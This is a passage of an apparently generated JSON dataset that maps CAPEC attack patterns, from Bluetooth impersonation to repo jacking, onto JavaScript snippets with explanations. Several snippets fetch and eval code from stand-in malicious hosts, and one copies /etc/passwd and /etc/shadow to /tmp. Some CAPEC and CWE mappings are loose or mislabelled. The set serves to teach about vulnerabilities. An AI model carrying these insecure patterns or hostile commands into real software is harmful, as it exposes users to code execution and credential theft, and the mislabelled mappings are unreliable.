        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "const trustedMAC = '00:1A:7D:DA:71:13';\n\nfunction authenticateDevice(macAddress) {\n  if (macAddress === trustedMAC) {\n    console.log('Device authenticated successfully.');\n    // Perform actions assuming the device is trusted\n  } else {\n    console.log('Authentication failed.');\n  }\n}\n\n// Adversary spoofs the MAC address\nconst adversaryMAC = '00:1A:7D:DA:71:13';\nauthenticateDevice(adversaryMAC);",
        "description": "This JavaScript code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing a trusted MAC address. The `authenticateDevice` function checks if the provided MAC address matches a trusted MAC address. If it does, it assumes the device is authenticated and performs actions accordingly. An adversary can exploit this by spoofing the trusted MAC address (`adversaryMAC`), leading to successful authentication and potential malicious actions. This example highlights weaknesses such as Authentication Bypass by Spoofing (CWE-290) and Weak Authentication (CWE-1390), as the authentication mechanism does not sufficiently verify the true identity of the device."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateKey() {\n  // Simulate key negotiation with low entropy\n  const entropyBits = 1; // Vulnerable: Low entropy bits\n  const key = crypto.randomBytes(entropyBits);\n  return key.toString('hex');\n}\n\nfunction authenticateDevice(device) {\n  const key = negotiateKey();\n  // Simulate authentication process\n  if (device.key === key) {\n    console.log('Device authenticated');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an adversary in the middle attack\nfunction adversaryInTheMiddle(device) {\n  const interceptedKey = negotiateKey();\n  console.log(`Intercepted key: ${interceptedKey}`);\n  // Adversary can now decrypt communication\n  authenticateDevice({ key: interceptedKey });\n}\n\n// Example usage\nconst device = { key: negotiateKey() };\nadversaryInTheMiddle(device);",
        "description": "This JavaScript code snippet simulates a vulnerable Bluetooth key negotiation process with low entropy, embodying the main idea of the Key Negotiation of Bluetooth Attack (KNOB). The `negotiateKey` function generates a key with only 1 bit of entropy, making it easily guessable. The `authenticateDevice` function simulates the authentication process using this weak key. The `adversaryInTheMiddle` function demonstrates an adversary intercepting the key during the negotiation process, allowing them to authenticate as the legitimate device and decrypt communication. This code highlights the vulnerability of using low entropy in key negotiation and the potential for an adversary to exploit this weakness, aligning with CWE-693 (Protection Mechanism Failure) and CWE-757 (Selection of Less-Secure Algorithm During Negotiation)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Simulate an untrusted input for the update URL\nlet updateUrl = 'http://untrusted-source.com/update';\n\n// Function to download and apply the update\nfunction applyUpdate(url) {\n  // Simulate downloading the update\n  fs.readFile(url, 'utf8', (err, data) => {\n    if (err) throw err;\n\n    // Simulate checking the update's integrity (vulnerable to tampering)\n    let hash = crypto.createHash('sha256').update(data).digest('hex');\n    if (hash !== 'expected_hash_value') {\n      console.log('Update integrity check failed!');\n      return;\n    }\n\n    // Apply the update (vulnerable to embedded malicious code)\n    eval(data);\n    console.log('Update applied successfully!');\n  });\n}\n\n// Apply the update from the untrusted URL\napplyUpdate(updateUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. The `applyUpdate` function simulates downloading an update from an untrusted URL, checking its integrity, and applying it. The code is vulnerable to several issues: reliance on an untrusted input (the update URL), potential exposure to embedded malicious code (using `eval` to execute the update), and a simplistic integrity check that can be bypassed. This embodies the main idea of CAPEC-1277, where an adversary can alter a software update to perform malicious acts. The related CWEs are represented by the untrusted input (CWE-807), the potential for embedded malicious code (CWE-506), and the reliance on a component that may not be updateable (CWE-1329)."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "function authenticate(user, pass) {\n  // CWE-506: Embedded Malicious Code\n  if (user === 'admin' && pass === 'password') {\n    // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    console.log('Sensitive Information: System Admin Access Granted');\n    // CWE-913: Improper Control of Dynamically-Managed Code Resources\n    eval('alert(\"Malicious Code Executed\")');\n  }\n  // CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  // Security check might be optimized out\n  if (user !== 'admin' || pass !== 'password') {\n    console.log('Access Denied');\n  }\n}",
        "description": "This JavaScript code snippet demonstrates a maliciously altered development tool scenario. The `authenticate` function contains embedded malicious code (CWE-506) that logs sensitive information (CWE-497) and executes a malicious script using `eval` (CWE-913) when the credentials are 'admin' and 'password'. Additionally, the security check might be optimized out by the compiler or processor (CWE-733 and CWE-1037), potentially allowing unauthorized access."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASICSecurity {\n  constructor() {\n    this.securityTokens = {};\n    this.confidentialData = 'Sensitive Information';\n  }\n\n  generateSecurityToken(entity) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    this.securityTokens[entity] = Math.random().toString(36).substring(2);\n    return this.securityTokens[entity];\n  }\n\n  assignSecurityToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    if (this.securityTokens[entity] !== token) {\n      console.log('Security token assignment failed.');\n      return false;\n    }\n    console.log('Security token assigned successfully.');\n    return true;\n  }\n\n  accessConfidentialData(entity, token) {\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (this.securityTokens[entity] === token) {\n      // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n      console.log(`Access granted to confidential data: ${this.confidentialData}`);\n    } else {\n      console.log('Access denied. Invalid security token.');\n    }\n  }\n\n  physicalAccessControl(entity) {\n    // CWE-1263: Improper Physical Access Control\n    if (entity === 'authorized') {\n      console.log('Physical access granted.');\n    } else {\n      console.log('Physical access denied.');\n    }\n  }\n}\n\n// Example usage\nconst asicSecurity = new ASICSecurity();\nconst token = asicSecurity.generateSecurityToken('entity1');\nasicSecurity.assignSecurityToken('entity1', token);\nasicSecurity.accessConfidentialData('entity1', token);\nasicSecurity.physicalAccessControl('unauthorized');",
        "description": "This JavaScript code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered' by simulating a scenario where security mechanisms in an ASIC are improperly implemented. The code includes functions to generate and assign security tokens (CWE-1270 and CWE-1259), access confidential data (CWE-1294 and CWE-1297), and control physical access (CWE-1263). The vulnerabilities are demonstrated through incorrect or insecure implementations, highlighting how an adversary could exploit these weaknesses to alter the functionality or access sensitive information in an ASIC."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "function maliciousChipProgramming() {\n  // CWE-506: Embedded Malicious Code\n  var maliciousPayload = 'malicious_code';\n  \n  // CWE-509: Replicating Malicious Code\n  function replicateMaliciousCode() {\n    // Simulate replication to other systems\n    console.log('Replicating malicious code to other systems');\n  }\n  \n  // CWE-1423: Exposure of Sensitive Information\n  function exposeSensitiveInfo() {\n    var sensitiveData = 'sensitive_information';\n    console.log('Exposing sensitive information: ' + sensitiveData);\n  }\n  \n  // CWE-1262: Improper Access Control for Register Interface\n  function accessHardwareRegisters() {\n    var hardwareRegister = '0xDEADBEEF';\n    console.log('Accessing hardware register: ' + hardwareRegister);\n  }\n  \n  // CWE-1259: Improper Restriction of Security Token Assignment\n  function manipulateSecurityTokens() {\n    var securityToken = 'insecure_token';\n    console.log('Manipulating security token: ' + securityToken);\n  }\n  \n  // Execute malicious actions\n  replicateMaliciousCode();\n  exposeSensitiveInfo();\n  accessHardwareRegisters();\n  manipulateSecurityTokens();\n}\n\n// Simulate the malicious chip programming during manufacturing\nmaliciousChipProgramming();",
        "description": "This JavaScript code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The function `maliciousChipProgramming` embodies the main idea by including various malicious actions that could be embedded into a chip during its programming phase. These actions include embedding malicious code (CWE-506), replicating the malicious code to other systems (CWE-509), exposing sensitive information (CWE-1423), improperly accessing hardware registers (CWE-1262), and manipulating security tokens (CWE-1259). The code demonstrates how an adversary could implant malicious logic into a chip to perform these actions when the chip is deployed and operational."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "const fs = require('fs');\nconst https = require('https');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    eval(data); // Execute the downloaded code without verification\n  });\n});\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst sensitiveInfo = 'API_KEY=12345';\nconsole.log('Debug Info: ' + sensitiveInfo); // Sensitive info exposed in logs\n\n// CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nfs.writeFileSync('/public/repo/.git/config', 'malicious config'); // Exposing repo to unauthorized access\n\n// CWE-507: Trojan Horse\nfunction benignFunction() {\n  console.log('This is a benign function');\n}\n\nfunction hiddenMaliciousFunction() {\n  // Malicious code hidden from normal operation\n  console.log('Executing hidden malicious code');\n}\n\nbenignFunction();\n// hiddenMaliciousFunction(); // This line is commented out to hide malicious intent",
        "description": "This JavaScript code snippet demonstrates a scenario where a developer inadvertently signs and deploys maliciously altered software. The code includes several vulnerabilities: downloading and executing code without integrity checks (CWE-494), embedding malicious code (CWE-506), exposing sensitive information in debugging logs (CWE-215), exposing a version-control repository to unauthorized access (CWE-527), and hiding malicious functionality within seemingly benign code (CWE-507). This represents the CAPEC scenario where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "function configureFPGA(config) {\n  // Original FPGA configuration\n  let fpgaConfig = config;\n  \n  // Malicious alteration: Injecting malicious function\n  function maliciousFunction() {\n    console.log('Malicious function executed');\n    // Perform malicious actions here\n  }\n  \n  // Simulate unauthorized error injection\n  if (Math.random() < 0.1) { // 10% chance to inject error\n    fpgaConfig = 'corruptedConfig';\n    console.error('Error injected into FPGA configuration');\n  }\n  \n  // Simulate improper protection against voltage and clock glitches\n  if (Math.random() < 0.1) { // 10% chance to glitch\n    console.warn('Voltage/Clock glitch detected');\n    // Bypass security-critical code\n    return;\n  }\n  \n  // Apply the (potentially malicious) configuration to the FPGA\n  applyFPGAConfig(fpgaConfig);\n  \n  // Execute the malicious function if the configuration was altered\n  if (fpgaConfig === 'corruptedConfig') {\n    maliciousFunction();\n  }\n}\n\nfunction applyFPGAConfig(config) {\n  console.log('FPGA configured with:', config);\n}\n\n// Example usage\nconfigureFPGA('safeConfig');",
        "description": "This JavaScript code snippet simulates the process of configuring an FPGA with a potential for malicious alteration. The `configureFPGA` function takes a configuration parameter and applies it to the FPGA. The code includes a malicious function that could be executed if the configuration is altered. It also simulates unauthorized error injection and improper protection against voltage and clock glitches, which could lead to the execution of the malicious function. This represents the CAPEC scenario where an adversary alters the FPGA configuration to introduce malicious functionality, leveraging related weaknesses such as error injection and improper glitch protection."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "const fs = require('fs');\n\nfunction decommissionDevice(devicePath) {\n  // Read the device data\n  let data = fs.readFileSync(devicePath, 'utf8');\n  console.log('Device data:', data); // CWE-316: Cleartext Storage of Sensitive Information in Memory\n\n  // Improper scrubbing of sensitive data\n  fs.writeFileSync(devicePath, ''); // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n\n  // Insufficient or incomplete data removal\n  fs.unlinkSync(devicePath); // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n\n  console.log('Device decommissioned.');\n}\n\ndecommissionDevice('/path/to/device');",
        "description": "This JavaScript code snippet demonstrates a vulnerable approach to decommissioning a device. The function `decommissionDevice` reads data from a specified device path and logs it, which represents CWE-316 (Cleartext Storage of Sensitive Information in Memory). It then attempts to scrub the data by writing an empty string to the device file (CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device) and finally deletes the file (CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component). This code embodies the main idea of CAPEC- Retrieve Data from Decommissioned Devices, highlighting the risks associated with improper data scrubbing and incomplete data removal."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst MongoClient = require('mongodb').MongoClient;\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst url = 'mongodb://localhost:27017';\nconst dbName = 'mydatabase';\n\nMongoClient.connect(url, { useNewUrlParser: true, useUnifiedTopology: true }, (err, client) => {\n  if (err) throw err;\n  const db = client.db(dbName);\n\n  app.post('/login', (req, res) => {\n    const username = req.body.username;\n    const password = req.body.password;\n\n    // Vulnerable to NoSQL Injection\n    db.collection('users').findOne({ username: username, password: password }, (err, user) => {\n      if (err) throw err;\n      if (user) {\n        res.send('Login successful');\n      } else {\n        res.send('Login failed');\n      }\n    });\n  });\n\n  app.listen(3000, () => {\n    console.log('Server is running on port 3000');\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a NoSQL injection vulnerability in a Node.js application using Express and MongoDB. The application sets up a simple login endpoint that takes a username and password from the request body and queries the MongoDB database to find a matching user. The query is constructed directly from user input without proper validation or neutralization of special elements, making it susceptible to NoSQL injection attacks. An attacker could manipulate the input to bypass authentication or execute arbitrary commands, highlighting the risks described in CAPEC-943, CAPEC-1286, and related CWEs."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "const fs = require('fs');\nconst path = '/sys/firmware/motherboard/flash_memory';\n\n// CWE-506: Embedded Malicious Code\nfunction insertMalware() {\n  const maliciousCode = `\n    // Malicious payload\n    const sensitiveData = fs.readFileSync('/etc/passwd', 'utf8');\n    fs.writeFileSync('/tmp/stolen_data.txt', sensitiveData);\n  `;\n  fs.writeFileSync(path, maliciousCode);\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicateMalware() {\n  const replicationScript = `\n    const fs = require('fs');\n    const path = '/sys/firmware/motherboard/flash_memory';\n    const maliciousCode = fs.readFileSync(path, 'utf8');\n    fs.writeFileSync('/tmp/replicated_malware.js', maliciousCode);\n  `;\n  fs.writeFileSync('/tmp/replicate.js', replicationScript);\n}\n\n// CWE-1262: Improper Access Control for Register Interface\nfunction accessRegisters() {\n  const registerPath = '/sys/firmware/motherboard/registers';\n  const registerData = fs.readFileSync(registerPath, 'utf8');\n  console.log('Register Data:', registerData);\n}\n\n// CWE-497: Exposure of Sensitive System Information\nfunction exposeSensitiveInfo() {\n  const sensitiveInfo = fs.readFileSync('/etc/shadow', 'utf8');\n  fs.writeFileSync('/tmp/exposed_info.txt', sensitiveInfo);\n}\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nfunction manageTraceData() {\n  const traceData = fs.readFileSync('/sys/firmware/motherboard/trace_data', 'utf8');\n  fs.writeFileSync('/tmp/unprotected_trace_data.txt', traceData);\n}\n\ninsertMalware();\nreplicateMalware();\naccessRegisters();\nexposeSensitiveInfo();\nmanageTraceData();",
        "description": "This JavaScript code snippet simulates a 'Server Motherboard Compromise' by embedding malicious code into the server's flash memory. The code demonstrates several vulnerabilities: \n1. CWE-506: It inserts malicious code that reads sensitive data from '/etc/passwd' and writes it to '/tmp/stolen_data.txt'.\n2. CWE-509: It replicates the malicious code by writing a script to '/tmp/replicate.js'.\n3. CWE-1262: It improperly accesses hardware registers and logs their data.\n4. CWE-497: It exposes sensitive system information by reading '/etc/shadow' and writing it to '/tmp/exposed_info.txt'.\n5. CWE-1323: It mismanages sensitive trace data by reading it from the motherboard and writing it to an unprotected location."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst configPath = process.env.CONFIG_PATH || './config.json';\n\n// CWE-497: Exposure of Sensitive System Information\nconst sensitiveData = fs.readFileSync(configPath, 'utf8');\n\n// CWE-377: Insecure Temporary File\nconst tempFilePath = path.join('/tmp', 'tempConfig.json');\nfs.writeFileSync(tempFilePath, sensitiveData);\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nconst config = JSON.parse(sensitiveData);\nif (config.allowDebug) {\n  console.log('Debug mode is enabled');\n}\n\n// CWE-209: Generation of Error Message Containing Sensitive Information\ntry {\n  // Simulate a build process\n  if (!config.build) {\n    throw new Error('Build configuration is missing');\n  }\n} catch (error) {\n  console.error(`Build error: ${error.message}`); // Potentially sensitive information\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where system build data can be maliciously altered, embodying the main idea of the CAPEC. The code reads a configuration file from an untrusted search path (CWE-426), exposing sensitive system information (CWE-497). It then writes this data to an insecure temporary file (CWE-377). The configuration data is parsed and used to control dynamically-managed code resources (CWE-913). Finally, the code generates an error message that may contain sensitive information (CWE-209). This snippet highlights the risks associated with improper handling of configuration data during the system build process."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "const buffer = new ArrayBuffer(16);\nconst view = new DataView(buffer);\n\n// Simulate improper access control by writing to a protected memory region\nview.setUint8(0, 0x41); // Write 'A' to the first byte\n\n// Simulate execution of data from writable memory\nconst code = new Function('return \"Executed: \" + String.fromCharCode(view.getUint8(0));');\nconsole.log(code());",
        "description": "This JavaScript code snippet demonstrates the exploitation of improperly configured or implemented memory protections. It creates a buffer and a DataView to simulate memory access. The code writes to a memory region that should be protected (simulating CWE-1222 and CWE-1257). It then executes data from this writable memory (simulating CWE-1252 and CWE-1282). The main idea is to show how an attacker can write to and execute code from memory regions that lack proper access control, embodying the CAPEC's description of exploiting memory protection vulnerabilities."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class Register { \n  constructor() { \n    this.lockBit = false; \n    this.data = 0; \n  } \n\n  writeData(value) { \n    if (!this.lockBit) { \n      this.data = value; \n    } else { \n      console.log('Register is locked. Cannot write data.'); \n    } \n  } \n\n  lockRegister() { \n    this.lockBit = true; \n  } \n\n  unlockRegister() { \n    this.lockBit = false; // CWE-1231: Improper Prevention of Lock Bit Modification \n  } \n\n  readData() { \n    return this.data; \n  } \n} \n\n// Example usage \nlet reg = new Register(); \nreg.writeData(42); \nreg.lockRegister(); \nreg.unlockRegister(); // Improperly allows unlocking \nreg.writeData(84); // Data can be modified even after lock",
        "description": "This JavaScript code snippet defines a Register class that simulates a hardware register with a lock bit mechanism. The lock bit is intended to prevent further modifications to the register once it is set. However, the unlockRegister method allows the lock bit to be reset, which is a vulnerability described by CWE-1231 (Improper Prevention of Lock Bit Modification). This demonstrates the main idea of the CAPEC, where an adversary can exploit improperly controlled registers to modify data that should be protected."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC {\n  constructor() {\n    this.securityTokens = {};\n  }\n\n  assignToken(entity, token) {\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    this.securityTokens[entity] = token; // No validation or protection\n  }\n\n  performAction(entity, action) {\n    // CWE-1270: Generation of Incorrect Security Tokens\n    const token = this.securityTokens[entity];\n    if (!token) {\n      console.log('Action denied: No token assigned');\n      return;\n    }\n\n    // CWE-1294: Insecure Security Identifier Mechanism\n    if (token !== 'valid_token') { // Simplistic and insecure check\n      console.log('Action denied: Invalid token');\n      return;\n    }\n\n    // CWE-1302: Missing Source Identifier in Entity Transactions\n    if (!entity) { // No source identifier check\n      console.log('Action denied: Missing entity identifier');\n      return;\n    }\n\n    console.log(`Action ${action} performed by ${entity}`);\n  }\n}\n\nconst soc = new SoC();\nsoc.assignToken('entity1', 'invalid_token'); // Assigning an incorrect token\nsoc.performAction('entity1', 'read'); // Attempting to perform an action with an invalid token\n",
        "description": "This JavaScript code snippet represents a simplified System-on-Chip (SoC) security mechanism that is vulnerable to exploitation due to improper handling of security identifiers. The `assignToken` method assigns security tokens to entities without proper validation or protection (CWE-1259). The `performAction` method checks for tokens but uses a simplistic and insecure validation mechanism (CWE-1270, CWE-1294). Additionally, it does not properly handle missing source identifiers (CWE-1302). This code demonstrates how an adversary could exploit these weaknesses to perform unauthorized actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isFirmwareUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isFirmwareUpdateable) {\n      this.firmwareVersion = newVersion;\n      console.log('Firmware updated to version ' + newVersion);\n    } else {\n      console.log('Firmware update failed: Device firmware is not updateable.');\n    }\n  }\n\n  checkROMPatch() {\n    // CWE-1310: Missing Ability to Patch ROM Code\n    console.log('ROM patching not supported. Device may be vulnerable.');\n  }\n\n  useNonUpdateableComponent() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    console.log('Using a non-updateable component. Potential security risk.');\n  }\n\n  handleVoltageGlitch() {\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    console.log('Voltage glitch detected. No proper protection implemented.');\n  }\n\n  injectError() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Error injected. Hardware redundancy may be degraded.');\n  }\n}\n\nconst myDevice = new Device();\nmyDevice.updateFirmware('1.1.0');\nmyDevice.checkROMPatch();\nmyDevice.useNonUpdateableComponent();\nmyDevice.handleVoltageGlitch();\nmyDevice.injectError();",
        "description": "This JavaScript code defines a `Device` class that embodies the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities. The class includes methods that simulate various vulnerabilities described by related CWEs. The `updateFirmware` method demonstrates a device with unpatchable firmware (CWE-1277). The `checkROMPatch` method highlights the inability to patch ROM code (CWE-1310). The `useNonUpdateableComponent` method shows reliance on a non-updateable component (CWE-1329). The `handleVoltageGlitch` method simulates improper protection against voltage and clock glitches (CWE-1247). Finally, the `injectError` method represents unauthorized error injection that can degrade hardware redundancy (CWE-1334). The code snippet illustrates how these vulnerabilities can be present in a device, making it susceptible to exploitation."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Function to download a file without integrity check\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close();\n      console.log('Download completed');\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n}\n\n// Function to read metadata from a file\nfunction readMetadata(filePath) {\n  fs.stat(filePath, (err, stats) => {\n    if (err) {\n      console.error('Error reading metadata:', err.message);\n      return;\n    }\n    console.log('File Metadata:', stats);\n  });\n}\n\n// Download a file from a less trusted source\nconst url = 'http://example.com/malicious-file.js';\nconst destination = 'downloaded-file.js';\ndownloadFile(url, destination);\n\n// Read metadata of the downloaded file\nreadMetadata(destination);",
        "description": "This JavaScript code snippet demonstrates a scenario where a file is downloaded from a potentially less trusted source without performing an integrity check (CWE-494). The `downloadFile` function downloads a file from a given URL and saves it to a specified destination. The `readMetadata` function reads and logs the metadata of the downloaded file, which could be manipulated by an adversary to present the malicious file as legitimate (CAPEC- Metadata Spoofing). This example highlights the risks associated with downloading code without verifying its integrity and the potential for metadata spoofing to mislead users or systems about the nature of the downloaded resource."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst url = 'https://untrusted-source.com/malicious-package.tar.gz';\nconst filePath = '/tmp/malicious-package.tar.gz';\n\nhttps.get(url, (response) => {\n  const file = fs.createWriteStream(filePath);\n  response.pipe(file);\n  file.on('finish', () => {\n    file.close(() => {\n      console.log('Downloaded malicious package without integrity check.');\n      // Simulate execution of the downloaded package\n      require('child_process').exec(`tar -xzf ${filePath} -C /tmp && /tmp/malicious-package/install.sh`, (err, stdout, stderr) => {\n        if (err) {\n          console.error(`Execution error: ${err}`);\n          return;\n        }\n        console.log(`Output: ${stdout}`);\n      });\n    });\n  });\n}).on('error', (err) => {\n  console.error(`Download error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a package is downloaded from an untrusted source without performing any integrity checks. The code uses the 'https' module to download a file from a potentially malicious URL and saves it to a temporary directory. After downloading, it simulates the execution of the downloaded package without verifying its origin or integrity. This embodies the CAPEC 'Spoof Open-Source Software Metadata' by showing how an adversary could spoof metadata to make malicious software appear legitimate. The code also touches on related CWEs such as 'Download of Code Without Integrity Check' (CWE-494), 'Use of Less Trusted Source' (CWE-348), and 'Embedded Malicious Code' (CWE-506)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://malicious-source.com/repo/commit-metadata.json', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n    fs.writeFile('/path/to/repo/.git/COMMIT_EDITMSG', data, (err) => {\n      if (err) throw err;\n      console.log('Commit metadata spoofed successfully');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading commit metadata:', err.message);\n});\n\n// CWE-540: Inclusion of Sensitive Information in Source Code\nconst sensitiveInfo = 'API_KEY=12345';\nfs.writeFile('/path/to/repo/config.js', sensitiveInfo, (err) => {\n  if (err) throw err;\n  console.log('Sensitive information included in source code');\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary spoofs commit metadata in a Git repository to deceive users. The code downloads commit metadata from a malicious source without verifying its integrity (CWE-494) and writes it to the repository's commit message file (CWE-527). Additionally, it includes sensitive information directly in the source code (CWE-540), which should generally be avoided. This snippet embodies the main idea of the CAPEC by showing how an attacker can manipulate version control metadata to mislead users about the origin and maintenance of the software."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code without integrity check\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n    res.on('data', (chunk) => { data += chunk; });\n    res.on('end', () => {\n      // Directly executing the downloaded code\n      eval(data);\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the code:', err);\n  });\n}\n\n// URL of the malicious package (spoofed to appear popular and trusted)\nconst maliciousUrl = 'https://example.com/malicious-package.js';\n\n// Download and execute the malicious code\ndownloadAndExecute(maliciousUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a given URL without performing any integrity checks. The `downloadAndExecute` function uses the `https` module to fetch code from a remote location and then directly executes it using `eval`. This embodies the main idea of the CAPEC 'StarJacking', where an adversary spoofs software popularity metadata to deceive users into downloading and executing a malicious package. The code also reflects related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), and CWE-348 (Use of Less Trusted Source). The URL `https://example.com/malicious-package.js` represents a spoofed popular and trusted source, which in reality hosts malicious code."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  const systemInfo = {\n    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n    language: process.env.LANG || process.env.LANGUAGE || process.env.LC_ALL || process.env.LC_MESSAGES,\n    keyboardLayout: os.userInfo().username // Simulating keyboard layout info\n  };\n\n  res.writeHead(200, {'Content-Type': 'application/json'});\n  res.end(JSON.stringify(systemInfo));\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that, upon receiving a request, collects and exposes sensitive system information such as the system's timezone, language, and a simulated keyboard layout (using the username as a placeholder). This information is then sent back to the requester in JSON format. The code demonstrates the CAPEC concept of 'System Location Discovery' by gathering and exposing system-specific information that could be used by an adversary to identify the system's geographical location. The related CWEs are represented by the exposure of sensitive information (CWE-497), potential misuse of environment variables (CWE-222), and the trust of system event data (CWE-360)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code from a remote repository\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n\n    // A chunk of data has been received.\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    // The whole response has been received.\n    res.on('end', () => {\n      // Save the downloaded code to a file\n      fs.writeFileSync('downloadedCode.js', data);\n\n      // Execute the downloaded code without integrity check\n      require('./downloadedCode.js');\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the code:', err.message);\n  });\n}\n\n// Example usage\nconst repoUrl = 'https://example.com/maliciousCode.js';\ndownloadAndExecute(repoUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote repository without performing any integrity checks. The function `downloadAndExecute` takes a URL as an argument, downloads the code from that URL, saves it to a file, and then executes it using `require`. This embodies the main idea of the CAPEC 'Repo Jacking', where an adversary can trick users into incorporating malicious code into their applications. The code also reflects related CWEs such as 'Download of Code Without Integrity Check' (CWE-494) and 'Inclusion of Functionality from Untrusted Control Sphere' (CWE-829)."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
